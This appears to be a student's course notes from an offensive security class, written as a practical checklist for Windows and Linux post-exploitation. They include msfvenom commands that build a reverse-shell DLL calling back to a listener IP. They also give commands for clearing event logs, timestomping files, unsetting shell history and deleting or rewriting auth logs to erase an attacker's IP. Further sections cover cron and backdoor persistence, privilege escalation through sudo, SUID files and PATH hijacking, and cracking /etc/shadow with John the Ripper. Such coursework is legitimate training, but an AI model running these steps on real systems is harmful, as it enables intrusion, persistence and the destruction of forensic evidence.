+Determine PS version (bunch of ways)
+    • reg query hklm\software\microsoft\powershell\3\powershellengine\
+    • powershell -command "$psversiontable"
+
+Determine if logging is set (PowerShell and WMIC)
+    • reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell
+    • reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
+          # 0 = no | 1 = errors | 2 = verbose
+WMIC Log Storage:
+%systemroot%\system32\wbem\Logs\``
+MANIPULATING LOGS AND FILES
+Find Files and Alter File attributes:
+    • forfiles /P c:\windows\system32 /S /D +05/14/2019
+    • wmic datafile where name='c:\\windows\\system32\\notepad.exe' get CreationDate, LastAccessed, LastModified
+    • copy /b filename.ext +,,
+    • $(Get-Item file.ext).lastaccesstime=$(date) |$(Get-Item test.txt).lastaccesstime=$(Get-Date "07/07/2004")
+Clear Event Logs:
+    • wevtutil clear-log Application
+    • Clear-Eventlog -Log Application, System
+
+msfvenom - -list payloads
+                  - -list format
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.50.35.221 LPORT=4444 -f dll > SSPICLI.dll
+
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\Student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+LINUX PRIVILEGE ESCALATION & PERSISTANCE
+    • Zeus is a old name for root account
+    • RSH is a Restricted Shell
+    • Don’t worry about capabilities that much for this class
+    • Cron can be used as a method of persistence
+    • Cron jobs run based as the user 
+    • World writable Files and Directories are places every user can write into “/tmp”
+    • Dot ‘.’ in the Path = We will never have to exploit this ourselves without being told we have to
+    • If you can’t buffer overflow the software you have to analyze the software to figure out how to exploit it and manipulate it
+    • We do not have to exploit unpatched kernel vulnerabilities only need to know they exist
+    • Methods to Maintain Linux Persistence
+        ◦ Add or Hijack User Account
+        ◦ Implement Boot Process Persistence
+        ◦ Add or Modify Cron jobs
+        ◦ Implement Kernel Modules with Backdoors
+        ◦ And other methods outside the FG …​
+    • ADDING OR HIJACKING A USER ACCOUNT
+        ◦ useradd
+        ◦ Adding vs Hijacking
+        ◦ User account considerations?
+        ◦ How do you access it?
+    • Don’t worry much about boot process Persistence
+PLAN
+    • Prior, after, before == know the system
+        ◦ What will happen if I do X == logs
+        ◦ Checks == where are things
+        ◦ Hide == file locations, names, times
+    • When does Covering Tracks start?
+ARTIFACTS
+    • Things that are left behind by a user or action done on a box
+    • Could be some of things
+        ◦ Logs
+        ◦ Users added or Deleted
+        ◦ left over connections
+NIX-ISM
+    • First thing: unset HISTFILE
+    • Need to be aware of what type of sysinit
+        ◦ SystemV, upstart, systemd to name a few
+        ◦ Determines what commands in use and logging structure.
+WAYS TO FIGURE INIT TYPE
+    • ls -latr /proc/1/exe
+    • stat /sbin/init
+    • man init
+    • init --version
+    • ps 1
+LOGS FOR COVERING TRACKS
+    • Logs typically housed in /var/log, some useful logs:
+        ◦ lastlog --- each users successful login time
+        ◦ btmp --- tracks bad login attempts
+        ◦ secure --- Syslog
+        ◦ sulog --- use of su command
+        ◦ utmp --- users currently on (w)
+            ▪ HARD AF WITHOUT TOOL
+        ◦ wtmp --- permanent record on user on/off
+            ▪ HARD AF WITHOUT TOOL
+        ◦ auth.log/secure --- tracks usage of authorization
+
+
+READING FILES
+    • cat /var/log/auth.log | egrep -v "opened|closed"
+    • awk '/opened/' /var/log/auth.log
+    • last OR lastb OR lastlog
+    • strings OR dd (for data files)
+    • more /var/log/syslog
+    • head/tail
+    • DON’T CAT A BINARY FILE
+    • file command will tell you the type of file
+Control your output with piping and more
+CLEANING THE LOGS
+    • Before we start cleaning, save the inodes
+    • Difference between mv, cp, cat
+    • Know what we are removing (entry times, IP, whole file, etc)
+CLEANING THE LOGS, BASIC
+    • Just get rid of it
+        ◦ rm -rf (/path/file)
+    • Blank it
+        ◦ cat /dev/null > (/path/file)
+        ◦ echo > /var/log/btmp
+CLEANING THE LOGS, PRECISION
+Always work off a backup
+    • egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
+    • cp auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log
+TIMESTOMP NIX
+Just know this exists but not needed for this course
+    • Access: updated when opened or used (grep, ls, cat, etc)
+    • Modify: update content of file or saved
+    • Change: file attribute change, file modified, moved, owner, permission
+    • touch -r
+    • touch -t
+        ◦ This leaves a artifact behind thats good to find
+LOGGING REMOTE
+    • Have to check the config
+        ◦ Identify Server
+        ◦ Identify what logs are shipped off
+    • Rsyslog, need to be careful - newer version calls different location for rules
+RSYSLOG
+    • Newer Rsyslog call /etc/rsyslog.d/* for settings/rules
+    • Older uses /etc/rsyslog.conf
+    • To find out:
+        ◦ grep "IncludeConfig" /etc/rsyslog.conf
+READING RSYSLOG
+    • Utilizes severity(priority) and facility levels
+    • rule is a filter, can use keyword or number
+    • If you see a comment it no log
+<facility>.<priority>
+
+DEMO STUFF
+    1) sudo -i
+        ◦ If it asks for password either input password or continue to something else if you don’t know it
+    2) If that doesn’t work
+        ◦ sudo -l
+        ◦ GTFOBin whatever you can sudo for vulnerabilities
+    3) If you can’t get something from the sudo -l
+        ◦ buffer overflow
+            ▪ If the device has GDB you have to buffer overflow something
+    4) If you can’t buffer overflow and GTFOBin it you have to analyze the machine which is long and hard 
+    5) See if there is any SUID/SGID that are vulnerable
+        ◦ SUID
+            ▪ find / -type f -perm /4000 2>/dev/null
+        ◦ SGID
+            ▪ find / -type f -perm /2000 2>/dev/null
+        ◦ SUID and/or SGID
+            ▪ find / -type f -perm /6000 2>/dev/null
+    6) ‘.’ Dot in the Path
+        ◦ Make a file into something that is a common command
+                • #!/bin/bash
+                • whoami > whoami.txt
+        ◦ chmod +x <file created that’s named after a command>
+    7) John The Ripper
+        ◦ sudo apt install john
+        ◦ /etc/passwd
+            ▪ Usernames
+        ◦ /etc/shadow
+            ▪ Hashed Passwords
+        ◦ To download rockyou.txt
+            ▪ Firefox
+            ▪ Google rockyou.txt
+            ▪ GitHub option 
+            ▪ Save file
+                • Saves it into Home directory In Downloads Directory
+        ◦ john <txt file with hashes> --wordlist=rockyou.txt
+        ◦ john <txt file> --show
+            ▪ Shows the previously cracked passwords
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
